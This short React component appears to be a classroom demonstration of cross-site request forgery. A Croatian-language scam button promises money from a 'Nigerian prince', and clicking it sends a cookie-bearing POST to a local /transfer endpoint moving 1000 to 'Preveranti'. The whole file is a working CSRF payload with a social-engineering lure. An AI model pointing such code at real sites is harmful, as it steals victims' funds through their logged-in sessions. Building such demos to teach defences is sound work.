import React from "react";

const CSRFButton = () => {
  function sendRequest() {
    const body = new URLSearchParams(
      "amount=1000&to=Preveranti"
    );
    fetch("http://localhost:8001/transfer", {
      body,
      credentials: "include", // include cookies, despite being a cross-origin request
      method: "post",
      mode: "no-cors",
    });
  }

  return <button onClick={sendRequest}>Nigerijski princ Vam je ostavio hrpu novca,<br/> klikni ovdje kako bi ih preuzeo...</button>;
};

export default CSRFButton;
